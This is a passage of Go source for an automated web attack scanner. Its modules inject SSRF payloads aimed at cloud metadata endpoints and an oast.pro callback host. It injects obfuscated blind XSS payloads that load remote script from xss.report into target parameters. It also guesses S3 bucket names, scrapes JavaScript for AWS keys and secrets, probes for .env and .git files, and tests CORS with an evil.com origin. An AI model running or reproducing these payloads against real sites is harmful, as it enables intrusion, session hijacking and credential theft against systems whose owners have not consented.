		   strings.Contains(string(output), "vulnerable")) {
			
			vuln := Vulnerability{
				Type:        "SQL Injection",
				Severity:    "CRITICAL",
				URL:         param.URL,
				Parameter:   param.ParamName,
				Evidence:    "SQLMap detected injectable parameter",
				Tool:        "sqlmap",
				Timestamp:   time.Now(),
				Remediation: "Use parameterized queries/prepared statements",
			}
			s.addVulnerability(vuln)
			fmt.Printf("%s[!] CRITICAL: SQLi found at %s (param: %s)%s\n",
				ColorRed, vuln.URL, vuln.Parameter, ColorReset)
		}
	}

	fmt.Printf("%s[✓] SQLMap tested %d parameters%s\n", ColorGreen, tested, ColorReset)
}

func (s *Scanner) scanSSRF() {
	fmt.Printf("\n%s%s[+] MODULE: SSRF SCANNING%s\n", ColorBold, ColorBlue, ColorReset)

	ssrfPayloads := []string{
		"http://127.0.0.1",
		"http://localhost",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		// Your custom SSRF callback
		"http://8f2487e5b6b6958eac86gthebphyyyyyb.oast.pro",
		"https://8f2487e5b6b6958eac86gthebphyyyyyb.oast.pro",
	}

	// Limit to 50 parameters for speed
	maxTest := 50
	if len(s.Result.Parameters) < maxTest {
		maxTest = len(s.Result.Parameters)
	}

	tested := 0
	for i := 0; i < maxTest; i++ {
		param := s.Result.Parameters[i]
		for _, payload := range ssrfPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", param.URL, param.ParamName, payload)

			req, _ := http.NewRequest("GET", testURL, nil)
			req.Header.Set("User-Agent", "Mozilla/5.0")

			// Add timeout to prevent hanging
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			req = req.WithContext(ctx)

			resp, err := s.Client.Do(req)
			cancel()
			
			if err == nil {
				body, _ := ioutil.ReadAll(resp.Body)
				resp.Body.Close()

				if strings.Contains(string(body), "ami-id") ||
					strings.Contains(string(body), "instance-id") {

					vuln := Vulnerability{
						Type:        "Server-Side Request Forgery (SSRF)",
						Severity:    "CRITICAL",
						URL:         param.URL,
						Parameter:   param.ParamName,
						Evidence:    fmt.Sprintf("SSRF to %s succeeded", payload),
						Tool:        "custom",
						Timestamp:   time.Now(),
						Remediation: "Implement URL whitelist and disable dangerous protocols",
					}
					s.addVulnerability(vuln)
					fmt.Printf("%s[!] CRITICAL: SSRF found at %s (param: %s)%s\n", 
						ColorRed, param.URL, param.ParamName, ColorReset)
					break
				}
			}
			tested++
		}
	}
	
	fmt.Printf("%s[✓] SSRF: Tested %d parameter combinations%s\n", ColorGreen, tested, ColorReset)
	fmt.Printf("%s[*] Check http://8f2487e5b6b6958eac86gthebphyyyyyb.oast.pro for callbacks%s\n", ColorYellow, ColorReset)
}

func (s *Scanner) scanBlindXSS() {
	fmt.Printf("\n%s%s[+] MODULE: BLIND XSS SCANNING%s\n", ColorBold, ColorBlue, ColorReset)

	// Your blind XSS payloads with xss.report callback
	blindXSSPayloads := []string{
		`"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3pxeiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>`,
		`"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3pxeiI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>`,
		`"><script src=https://xss.report/c/zqz></script>`,
		`javascript:"/*'/*` + "`" + `/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=(import(/https:\xss.report\c\zqz/.source))//>`,
	}

	if len(s.Result.Parameters) == 0 {
		fmt.Printf("%s[!] No parameters found to test%s\n", ColorYellow, ColorReset)
		return
	}

	// Limit to 50 parameters for speed
	maxTest := 50
	if len(s.Result.Parameters) < maxTest {
		maxTest = len(s.Result.Parameters)
	}

	tested := 0
	for i := 0; i < maxTest; i++ {
		param := s.Result.Parameters[i]

		for _, payload := range blindXSSPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", param.URL, param.ParamName, payload)

			req, _ := http.NewRequest("GET", testURL, nil)
			req.Header.Set("User-Agent", "Mozilla/5.0")

			// Add timeout
			ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
			req = req.WithContext(ctx)

			resp, err := s.Client.Do(req)
			cancel()
			
			if err == nil {
				resp.Body.Close()
				tested++
			}
		}
	}

	fmt.Printf("%s[✓] Blind XSS: Injected payloads into %d parameters%s\n", ColorGreen, tested/len(blindXSSPayloads), ColorReset)
	fmt.Printf("%s[*] Check https://xss.report/c/zqz for callbacks%s\n", ColorYellow, ColorReset)
}

// ==================== CLOUD STORAGE SCANNING ====================

func (s *Scanner) scanS3Buckets() {
	fmt.Printf("\n%s%s[+] MODULE: CLOUD STORAGE SCANNING%s\n", ColorBold, ColorBlue, ColorReset)

	bucketNames := s.generateBucketNames()
	fmt.Printf("%s[*] Generated %d potential bucket names%s\n", ColorCyan, len(bucketNames), ColorReset)

	var wg sync.WaitGroup
	results := make(chan S3Bucket, len(bucketNames))
	semaphore := make(chan struct{}, 20)

	for _, bucketName := range bucketNames {
		wg.Add(1)
		go func(name string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			bucket := s.checkS3Bucket(name)
			if bucket.Name != "" {
				results <- bucket
			}
		}(bucketName)
	}

	go func() {
		wg.Wait()
		close(results)
	}()

	for bucket := range results {
		s.mu.Lock()
		s.Result.S3Buckets = append(s.Result.S3Buckets, bucket)
		s.mu.Unlock()

		if bucket.Public || bucket.Listable {
			vuln := Vulnerability{
				Type:        "Exposed S3 Bucket",
				Severity:    "HIGH",
				URL:         fmt.Sprintf("s3://%s", bucket.Name),
				Evidence:    fmt.Sprintf("Public: %v, Listable: %v", bucket.Public, bucket.Listable),
				Tool:        "s3-scanner",
				Timestamp:   time.Now(),
				Remediation: "Enable bucket encryption and block public access",
			}
			s.addVulnerability(vuln)
			fmt.Printf("%s[!] S3 Bucket exposed: %s%s\n", ColorYellow, bucket.Name, ColorReset)
		}
	}

	fmt.Printf("%s[✓] Found %d S3 buckets%s\n", ColorGreen, len(s.Result.S3Buckets), ColorReset)
}

func (s *Scanner) generateBucketNames() []string {
	domain := strings.ReplaceAll(s.Domain, ".", "-")
	domainParts := strings.Split(s.Domain, ".")
	companyName := domainParts[0]

	baseNames := []string{s.Domain, domain, companyName}
	suffixes := []string{"", "-backup", "-prod", "-dev", "-test", "-assets", "-data", "-logs"}

	var buckets []string
	seen := make(map[string]bool)

	for _, base := range baseNames {
		for _, suffix := range suffixes {
			name := base + suffix
			if !seen[name] && len(name) >= 3 && len(name) <= 63 {
				seen[name] = true
				buckets = append(buckets, strings.ToLower(name))
			}
		}
	}

	return buckets
}

func (s *Scanner) checkS3Bucket(bucketName string) S3Bucket {
	bucket := S3Bucket{
		Name:       bucketName,
		BucketType: "s3",
	}

	url := fmt.Sprintf("https://%s.s3.amazonaws.com", bucketName)
	resp, err := s.Client.Head(url)
	if err != nil {
		return S3Bucket{}
	}
	defer resp.Body.Close()

	if resp.StatusCode == 404 {
		return S3Bucket{}
	}

	bucket.Name = bucketName

	if resp.StatusCode == 200 {
		bucket.Public = true

		listResp, err := s.Client.Get(url)
		if err == nil {
			defer listResp.Body.Close()
			body, _ := ioutil.ReadAll(listResp.Body)
			if strings.Contains(string(body), "<ListBucketResult>") {
				bucket.Listable = true
			}
		}
	}

	return bucket
}

// ==================== JAVASCRIPT ANALYSIS ====================

func (s *Scanner) analyzeJavaScript() {
	fmt.Printf("\n%s%s[+] MODULE: JAVASCRIPT CRYPTO ANALYSIS%s\n", ColorBold, ColorBlue, ColorReset)

	jsFiles := s.findJSFiles()

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, 10)

	for _, jsURL := range jsFiles {
		wg.Add(1)
		go func(url string) {
			defer wg.Done()
			semaphore <- struct{}{}
			defer func() { <-semaphore }()

			s.analyzeJSFile(url)
		}(jsURL)
	}

	wg.Wait()

	s.mu.Lock()
	count := len(s.Result.JSFindings)
	s.mu.Unlock()

	fmt.Printf("%s[✓] Analyzed %d JS files, found %d issues%s\n",
		ColorGreen, len(jsFiles), count, ColorReset)
}

func (s *Scanner) findJSFiles() []string {
	var jsFiles []string
	seen := make(map[string]bool)

	for _, host := range s.Result.LiveHosts {
		resp, err := s.Client.Get(host)
		if err != nil {
			continue
		}

		body, _ := ioutil.ReadAll(resp.Body)
		resp.Body.Close()

		jsRegex := regexp.MustCompile(`(?:src|href)=["']([^"']+\.js[^"']*)["']`)
		matches := jsRegex.FindAllStringSubmatch(string(body), -1)

		for _, match := range matches {
			if len(match) > 1 {
				jsURL := match[1]
				if !strings.HasPrefix(jsURL, "http") {
					if strings.HasPrefix(jsURL, "//") {
						jsURL = "https:" + jsURL
					} else if strings.HasPrefix(jsURL, "/") {
						jsURL = host + jsURL
					}
				}

				if !seen[jsURL] {
					seen[jsURL] = true
					jsFiles = append(jsFiles, jsURL)
				}
			}
		}
	}

	return jsFiles
}

func (s *Scanner) analyzeJSFile(url string) {
	resp, err := s.Client.Get(url)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	content := string(body)

	patterns := map[string]struct {
		regex       string
		severity    string
		findingType string
	}{
		"Hardcoded Key": {
			regex:       `(?i)(?:key|secret|password)\s*[:=]\s*["'][a-zA-Z0-9+/=]{16,}["']`,
			severity:    "CRITICAL",
			findingType: "Hardcoded Encryption Key",
		},
		"AWS Keys": {
			regex:       `(?:AKIA|ASIA)[0-9A-Z]{16}`,
			severity:    "CRITICAL",
			findingType: "AWS Access Key",
		},
		"API Keys": {
			regex:       `['"](?:api[_-]?key|apikey)['"]:\s*['"]([^'"]{20,})['"]`,
			severity:    "CRITICAL",
			findingType: "Hardcoded API Key",
		},
	}

	lines := strings.Split(content, "\n")

	for _, patternData := range patterns {
		re := regexp.MustCompile(patternData.regex)

		for lineNum, line := range lines {
			if matches := re.FindAllString(line, -1); len(matches) > 0 {
				for _, match := range matches {
					displayMatch := match
					if len(match) > 30 {
						displayMatch = match[:15] + "...[REDACTED]..."
					}

					finding := JSFinding{
						URL:      url,
						Type:     patternData.findingType,
						Finding:  displayMatch,
						Line:     lineNum + 1,
						Severity: patternData.severity,
					}

					s.mu.Lock()
					s.Result.JSFindings = append(s.Result.JSFindings, finding)
					s.mu.Unlock()

					if patternData.severity == "CRITICAL" {
						vuln := Vulnerability{
							Type:        fmt.Sprintf("JS: %s", patternData.findingType),
							Severity:    patternData.severity,
							URL:         url,
							Evidence:    fmt.Sprintf("Line %d", lineNum+1),
							Tool:        "js-analyzer",
							Timestamp:   time.Now(),
							Remediation: "Remove hardcoded secrets",
						}
						s.addVulnerability(vuln)
						fmt.Printf("%s[!] CRITICAL: %s in %s%s\n",
							ColorRed, patternData.findingType, filepath.Base(url), ColorReset)
					}
				}
			}
		}
	}
}

// ==================== NUCLEI INTEGRATION ====================

func (s *Scanner) runNuclei() {
	fmt.Printf("\n%s%s[+] MODULE: NUCLEI SCAN%s\n", ColorBold, ColorBlue, ColorReset)

	if len(s.Result.LiveHosts) == 0 {
		fmt.Printf("%s[!] No live hosts to scan%s\n", ColorYellow, ColorReset)
		return
	}

	hostsFile, _ := os.Create("live_hosts.txt")
	for _, host := range s.Result.LiveHosts {
		fmt.Fprintln(hostsFile, host)
	}
	hostsFile.Close()

	fmt.Printf("%s[*] Running Nuclei on %d hosts (fast mode)...%s\n", ColorCyan, len(s.Result.LiveHosts), ColorReset)

	// Fast Nuclei scan - only critical/high, with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx, "nuclei",
		"-list", "live_hosts.txt",
		"-severity", "critical,high",
		"-silent",
		"-rate-limit", "300",
		"-concurrency", "100",
		"-timeout", "5",
		"-retries", "1",
		"-max-host-error", "3",
	)

	output, err := cmd.CombinedOutput()
	
	if ctx.Err() == context.DeadlineExceeded {
		fmt.Printf("%s[!] Nuclei timeout after 5 minutes%s\n", ColorYellow, ColorReset)
	}
	
	if err != nil && len(output) == 0 {
		fmt.Printf("%s[!] Nuclei not found or error: %v%s\n", ColorYellow, err, ColorReset)
		return
	}

	vulnerabilitiesFound := 0
	scanner := bufio.NewScanner(strings.NewReader(string(output)))
	
	for scanner.Scan() {
		line := scanner.Text()
		
		// Parse nuclei output format: [severity] [template-id] url
		if strings.Contains(line, "[critical]") || strings.Contains(line, "[high]") {
			vulnerabilitiesFound++
			
			severity := "HIGH"
			if strings.Contains(line, "[critical]") {
				severity = "CRITICAL"
			}
			
			vuln := Vulnerability{
				Type:      "Nuclei: " + line,
				Severity:  severity,
				URL:       line,
				Tool:      "nuclei",
				Timestamp: time.Now(),
			}
			
			s.addVulnerability(vuln)
			
			color := ColorRed
			if severity == "HIGH" {
				color = ColorYellow
			}
			fmt.Printf("%s[!] %s%s\n", color, line, ColorReset)
		}
	}

	if vulnerabilitiesFound > 0 {
		fmt.Printf("%s[✓] Nuclei found %d vulnerabilities%s\n", ColorGreen, vulnerabilitiesFound, ColorReset)
	} else {
		fmt.Printf("%s[*] Nuclei completed - no critical/high vulnerabilities found%s\n", ColorCyan, ColorReset)
	}
}

// ==================== ADDITIONAL SCANS ====================

func (s *Scanner) scanPorts() {
	// Port scanning implementation (optional)
}

func (s *Scanner) fuzzDirectories() {
	fmt.Printf("\n%s%s[+] MODULE: DIRECTORY FUZZING%s\n", ColorBold, ColorBlue, ColorReset)

	sensitivePaths := []string{
		"/.git/HEAD", "/.env", "/admin", "/api/v1", "/backup",
	}

	var wg sync.WaitGroup
	semaphore := make(chan struct{}, s.Threads)

	for _, host := range s.Result.LiveHosts {
		for _, path := range sensitivePaths {
			wg.Add(1)
			go func(h, p string) {
				defer wg.Done()
				semaphore <- struct{}{}
				defer func() { <-semaphore }()

				testURL := h + p
				resp, err := s.Client.Get(testURL)
				if err == nil && resp.StatusCode == 200 {
					body, _ := ioutil.ReadAll(resp.Body)
					resp.Body.Close()

					if len(body) > 0 {
						vuln := Vulnerability{
							Type:        "Information Disclosure",
							Severity:    "MEDIUM",
							URL:         testURL,
							Evidence:    "Sensitive file exposed",
							Tool:        "directory-fuzzer",
							Timestamp:   time.Now(),
							Remediation: "Restrict access to sensitive files",
						}
						s.addVulnerability(vuln)
						fmt.Printf("%s[!] Found: %s%s\n", ColorYellow, testURL, ColorReset)
					}
				}
			}(host, path)
		}
	}

	wg.Wait()
}

func (s *Scanner) checkCORS() {
	fmt.Printf("\n%s%s[+] MODULE: CORS CHECK%s\n", ColorBold, ColorBlue, ColorReset)

	for _, host := range s.Result.LiveHosts {
		req, _ := http.NewRequest("GET", host, nil)
		req.Header.Set("Origin", "https://evil.com")

		resp, err := s.Client.Do(req)
		if err != nil {
			continue
		}

		acao := resp.Header.Get("Access-Control-Allow-Origin")
		acac := resp.Header.Get("Access-Control-Allow-Credentials")
		resp.Body.Close()

		if (acao == "https://evil.com" || acao == "*") && acac == "true" {
			vuln := Vulnerability{
				Type:        "CORS Misconfiguration",
				Severity:    "HIGH",
				URL:         host,
				Evidence:    fmt.Sprintf("ACAO: %s, Credentials: %s", acao, acac),
				Tool:        "cors-checker",
				Timestamp:   time.Now(),
				Remediation: "Implement proper CORS whitelist",
			}
			s.addVulnerability(vuln)
			fmt.Printf("%s[!] CORS misconfiguration: %s%s\n", ColorRed, host, ColorReset)
		}
	}
}

// ==================== REPORT GENERATION ====================

func (s *Scanner) addVulnerability(vuln Vulnerability) {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.Result.Vulnerabilities = append(s.Result.Vulnerabilities, vuln)
}

func (s *Scanner) generateReport() {
	s.Result.Statistics.TotalSubdomains = len(s.Result.Subdomains)
	s.Result.Statistics.LiveHosts = len(s.Result.LiveHosts)
	s.Result.Statistics.ParametersFound = len(s.Result.Parameters)
	s.Result.Statistics.VulnerabilitiesFound = len(s.Result.Vulnerabilities)
	s.Result.Statistics.S3BucketsFound = len(s.Result.S3Buckets)
	s.Result.Statistics.JSFilesAnalyzed = len(s.Result.JSFindings)

	for _, vuln := range s.Result.Vulnerabilities {
		switch vuln.Severity {
		case "CRITICAL":
			s.Result.Statistics.CriticalVulns++
		case "HIGH":
			s.Result.Statistics.HighVulns++
		case "MEDIUM":
			s.Result.Statistics.MediumVulns++
		}
	}

	reportJSON, _ := json.MarshalIndent(s.Result, "", "  ")
	ioutil.WriteFile(s.Output, reportJSON, 0644)

	s.printSummary()
}

func (s *Scanner) printSummary() {
	fmt.Printf("\n%s%s", ColorBold, strings.Repeat("=", 70))
	fmt.Printf("\n                    SCAN SUMMARY\n")
	fmt.Printf("%s%s\n", strings.Repeat("=", 70), ColorReset)

	fmt.Printf("%sDomain:%s %s\n", ColorCyan, ColorReset, s.Domain)
	fmt.Printf("%sSubdomains Found:%s %d\n", ColorCyan, ColorReset, s.Result.Statistics.TotalSubdomains)
	fmt.Printf("%sLive Hosts:%s %d\n", ColorCyan, ColorReset, s.Result.Statistics.LiveHosts)
	fmt.Printf("%sParameters Mined:%s %d\n", ColorCyan, ColorReset, s.Result.Statistics.ParametersFound)
	fmt.Printf("%sS3 Buckets Found:%s %d\n", ColorCyan, ColorReset, s.Result.Statistics.S3BucketsFound)
	fmt.Printf("%sJS Files Analyzed:%s %d\n", ColorCyan, ColorReset, s.Result.Statistics.JSFilesAnalyzed)

	fmt.Printf("\n%sVulnerabilities by Severity:%s\n", ColorBold, ColorReset)
	fmt.Printf("%s  CRITICAL: %d%s\n", ColorRed, s.Result.Statistics.CriticalVulns, ColorReset)
	fmt.Printf("%s  HIGH:     %d%s\n", ColorRed, s.Result.Statistics.HighVulns, ColorReset)
	fmt.Printf("%s  MEDIUM:   %d%s\n", ColorYellow, s.Result.Statistics.MediumVulns, ColorReset)
	fmt.Printf("%s  TOTAL:    %d%s\n\n", ColorGreen, s.Result.Statistics.VulnerabilitiesFound, ColorReset)

	if len(s.Result.Vulnerabilities) > 0 {
		fmt.Printf("%sTop Critical Findings:%s\n", ColorBold, ColorReset)
		count := 0
		for _, vuln := range s.Result.Vulnerabilities {
			if vuln.Severity == "CRITICAL" && count < 5 {
				fmt.Printf("%s  - %s: %s%s\n", ColorRed, vuln.Type, vuln.URL, ColorReset)
				count++
			}
		}
		fmt.Println()
	}

	fmt.Printf("%s%s%s\n", ColorBold, strings.Repeat("=", 70), ColorReset)
}
